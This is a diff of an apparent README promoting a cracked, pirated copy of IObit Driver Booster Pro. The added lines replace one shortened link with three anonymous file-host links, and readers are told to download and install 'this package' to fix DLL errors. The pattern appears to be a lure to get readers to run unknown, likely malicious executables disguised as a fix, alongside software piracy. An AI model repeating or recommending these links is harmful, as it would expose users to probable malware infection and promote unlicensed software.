@@ -6,4 +6,9 @@ IObit Driver Booster will scan your missing drivers, find outdated ones for you 
 ## https://www.fullprogramlarindir.net/iobit-driver-booster-pro-indir-full-turkce-7720081.html
 
 # If you get DLL error after installing the program
-## https://bit.ly/3l88zJb Install This Package and Restart Your System.
+## Install This Package and Restart Your System. (ALL LİNKS ARE SAME!)
+### 1: https://turb.pw/uui6qpd9s6eh.html
+
+### 2: https://uploady.io/48vchzktha9y
+
+### 3: https://up.d-ld.net/dbd357eb7a
